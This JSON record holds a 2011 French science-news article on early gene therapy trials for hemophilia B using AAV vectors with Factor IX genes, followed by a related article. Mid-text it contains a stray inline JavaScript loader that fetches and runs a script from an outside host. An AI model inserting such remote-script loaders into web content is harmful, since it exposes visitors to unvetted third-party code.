{"title": "Hemophilie : un espoir avec la therapie genique", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2011-12-12", "content": "Une therapie genique experimentale menee sur dix patients souffrant d'hemophilie B a donne des resultats encourageants. Le protocole a consiste a injecter un gene codant pour un facteur de coagulation a l'aide d'un vecteur viral. L' hemophilie  est une maladie hereditaire liee au  chromosome  X, qui touche donc essentiellement des garcons. Elle entraine des hemorragies spontanees et des saignements anormaux apres des blessures mineures. L' hemophilie  B est due a une mutation qui empeche l'activite normale du facteur de  coagulation  IX. Le traitement habituel consiste a injecter au patient des facteurs de substitution, soit lors d'une hemorragie, soit en prevention. Depuis plusieurs annees, des chercheurs tentent de proposer une  therapie genique  qui permettrait aux patients de produire leurs propres facteurs de coagulation. Ici, les scientifiques ont utilise un  gene  codant pour un facteur de coagulation particulierement efficace appele Factor IX-Padua (FIX-Padua), decouvert dans une famille italienne en 2009. Le gene du FIX-Padua a ete insere dans un vecteur viral adeno-associe (AAV) avec un promoteur specifique du foie pour exprimer le  gene  dans cet organe.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Moins d'hemorragies apres injection du gene  Les premiers resultats de cet essai clinique paraissent dans la revue  New England Journal of Medicine . Au depart, les participants avaient au maximum 2 % de l'activite normale du  facteur IX . Apres injection du gene, ils ont pu produire le facteur de coagulation et obtenir une moyenne d'environ 33 % de l'activite normale. La plupart des patients pouvaient meme arreter leur traitement, a savoir les perfusions de facteur de coagulation en intraveineuse. Neuf patients sur dix n'ont pas eu de saignements anormaux. Deux patients ont eu une elevation des enzymes hepatiques qui a ete traitee avec de la prednisone. L'essai clinique realise par une equipe de l'hopital pour enfants de Philadelphie (Pennsylvanie, Etats-Unis) a ete finance par la societe Spark Therapeutics de Philadelphie. Pour en savoir plus La therapie genique s'attaque a l'hemophilie avec succes Article de Janlou Chaput paru le 12 decembre 2011 Pour la premiere fois, un  essai de therapie genique dirige contre l'hemophilie  laisse entrevoir un espoir de  remission .  Grace a un nouveau  virus  vecteur, utilise par des chercheurs anglais, de bons resultats viennent d'etre rapportes chez l'Homme. De plus, la methode pourrait etre adaptee a d'autres  pathologies . Quand la paroi d'un vaisseau est endommagee, l'organisme reagit instantanement pour limiter la perte de  sang  grace au phenomene de la  coagulation  sanguine. Elle fait intervenir une multitude d'acteurs ( plaquettes ,  fibrinogene , prothrombine,  calcium ...) qui dans une cascade de reactions aboutissent a la formation d'un  caillot , stoppant l'hemorragie. Il suffit qu'un seul de ces intervenants soit absent ou present en trop faible quantite pour conduire a des troubles de la coagulation sanguine, et donc augmenter les risques d'hemorragie. C'est ce qui se produit chez les personnes atteintes d' hemophilie , trouble existant sous plusieurs formes selon le facteur de coagulation affecte. Dans la majorite des cas, il s'agit de mutations portant sur le chromosome X, les hommes sont donc tres majoritairement affectes. La forme A est la plus frequente et concerne un homme sur 5.000 naissances, quand la forme B se retrouve chez un homme sur 30.000. L'hemophilie C est encore plus rare, avec un cas pour 100.000 mais n'est pas liee au sexe. Il existe egalement d'autres versions encore plus rares.  A l'heure actuelle, les patients sont traites par injections regulieres (2 a 3 fois par semaine) de la  proteine  qui leur fait defaut. La  therapie genique  a tente de venir a la rescousse des hemophiles mais jusque-la, elle avait toujours connu l'echec. La piste suivie par une equipe de chercheurs de l' University College  de Londres  pourrait cependant susciter un nouvel espoir. AAV8 fait renaitre le facteur IX chez des hemophiles Parus dans le  New England Journal of Medicine  et commentes lors de la 53 e  reunion annuelle de l' American Society of Hematology , ces travaux de recherche ont mis au jour le moyen de faire remonter les taux de facteur IX chez 6 personnes atteintes d'hemophilie B par l'insertion d'un gene. Cette hemophilie se caracterise par une mutation du gene F9 porte par le chromosome X et codant donc pour le facteur IX, une proteine du sang qui joue le role d'intermediaire indispensable a la coagulation en permettant la synthese d'une  enzyme  : la thromboplastine. Les adenovirus, ici observes au microscope electronique a transmission, sont des virus a ADN qui peuvent etre utilises comme vecteurs de transfert de genes. Ici, c'est le virus adenoassocie AAV8, infectant les cellules hepatiques sans dommage, qui a ete utilise. (c)  Center for Disease Control and Prevention , Wikipedia, DP                               Les 6 cobayes humains ont recu l'injection en une fois d'un  adenovirus  (AAV8 pour  adeno-associated virus 8 ) qu'on avait equipe d'une version efficace du gene F9. Ce virus cible les cellules hepatiques mais est connu pour ne pas induire de maladie chez l'Homme. Ceci explique donc pourquoi aucun des patients n'a du subir un  traitement immunosuppresseur . Les patients etaient classes en trois groupes de deux : le premier groupe a recu une faible dose, le deuxieme une dose intermediaire tandis que le troisieme a subi des injections a haute dose. De multiples applications en perspective Toutes ces personnes, dont le facteur IX etait retrouve a moins de 1 % du niveau normal, ont vu ses concentrations atteindre 2 a 12 %, un taux retrouve chez l'un des individus hautement dose. Ces changements, meme modestes, ont une  incidence  heureuse sur le confort des patients. Ainsi, ils sont passes d'une hemophilie severe a une hemophilie moderee, voire mineure pour les sujets les plus efficacement traites. Quatre de ces cobayes ne recoivent plus d'injections de proteines et les saignements spontanes n'ont pas repris. Certains ont meme pris part a un marathon et effectue des activites qui leur etaient auparavant interdites, demontrant bien l'ampleur du pas qui vient d'etre franchi. Le premier auteur de l'etude, Amit Nathwani, y voit de grandes raisons d'esperer. <<  D'une part, cette therapie pourrait changer la vie des patients atteints d'hemophilie B, mais c'est aussi une etape importante pour la therapie genique. Elle pourrait ouvrir des pistes pour le traitement de l'hemophilie A, de troubles hepatiques et de maladies chroniques comme la  mucoviscidose .  >> Les futures  applications  pourraient donc etre tres nombreuses ! Cela vous interessera aussi Interview 5/5 : les maladies genetiques sont-elles hereditaires ?                       Une maladie genetique est due a une anomalie d'un ou plusieurs chromosomes, ce qui entraine un defaut de fonctionnement de certaines cellules de l'organisme. Jean-Louis Serre, professeur de genetique, nous parle plus en detail de ces maladies.                                       ", "theme": "sante"}